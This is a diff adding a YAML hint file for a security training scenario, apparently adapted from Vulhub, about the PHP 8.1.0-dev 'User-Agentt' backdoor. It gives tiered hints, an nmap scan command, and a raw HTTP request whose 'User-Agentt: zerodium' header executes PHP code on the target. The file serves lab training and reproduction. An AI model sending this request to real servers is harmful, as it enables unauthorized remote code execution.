@@ -1,0 +1,86 @@
+# Optional ScenarioForge guide hints; derived from the adjacent public Vulhub documentation.
+schema_version: 1
+match: php/8.1-backdoor
+hint_levels:
+  low:
+  - Inspect the php service or application on {{NODE_NAME}} @ {{NODE_IP}}.
+  medium:
+  - |-
+    Catalog TCP ports: 8080. Identify the exposed services:
+
+    ```bash
+    nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+    ```
+  - 'Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults;
+    use the deployed service port if the scenario remaps it.'
+  - 'Documented target URL(s): `http://{{NODE_IP}}:8080`.'
+  high:
+  - 'Vulnerability: PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution.'
+  - Send the raw request examples with an HTTP client that recalculates Content-Length after target and payload
+    substitutions.
+  - |-
+    Vulnerability Reproduce
+
+    Send the following request to execute the code `var_dump(233*233);`:
+
+    ```
+    GET / HTTP/1.1
+    Host: {{NODE_IP}}:8080
+    Accept-Encoding: gzip, deflate
+    Accept: */*
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+    User-Agentt: zerodiumvar_dump(233*233);
+    Connection: close
+
+
+    ```
+
+    Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/8.1-backdoor/1.png
+  - 'Publicly available documentation: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/8.1-backdoor/README.md'
+  - |-
+    Additional public references:
+    - https://news-web.php.net/php.internals/113838
+    - https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d
+    - https://github.com/php/php-src/commit/2b0f239b211c7544ebc7a4cd2c977a5b7a11ed8a
+access_instructions:
+  title: PHP 8.1.0-dev User-Agentt Backdoor Remote Code Execution
+  steps:
+  - title: Locate the target service
+    instructions: |-
+      Catalog TCP ports: 8080. Identify the exposed services:
+
+      ```bash
+      nmap -Pn -sT -sV -p 8080 {{NODE_IP}}
+      ```
+
+      Catalog port mappings (published → container): web: 8080/tcp → container 80/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.
+
+      Documented target URL(s): `http://{{NODE_IP}}:8080`.
+  - title: Vulnerability Reproduce
+    instructions: |-
+      Send the following request to execute the code `var_dump(233*233);`:
+
+      ```
+      GET / HTTP/1.1
+      Host: {{NODE_IP}}:8080
+      Accept-Encoding: gzip, deflate
+      Accept: */*
+      Accept-Language: en
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
+      User-Agentt: zerodiumvar_dump(233*233);
+      Connection: close
+
+
+      ```
+
+      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/8.1-backdoor/1.png
+guidance_source:
+  repository: https://github.com/vulhub/vulhub
+  snapshot_commit: 3af973a39bd0988f288a53fa9ea4b82372774e58
+  documentation_url: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/php/8.1-backdoor/README.md
+  readme_sha256: 0d1d21318445b353af6b9aea3608074323104b72589d03e1c3815f124551cfb7
+  compose_sha256: 9a175478ee20cf27f7b6b2881b3b1cdfb828a318f72569121695f98dec58ad6f
+  license: MIT; see vulnhub/content/LICENSE
+  method: Tiered discovery hints and adapted reproduction text from the local catalog snapshot. Reproduction commands
+    have not been executed.
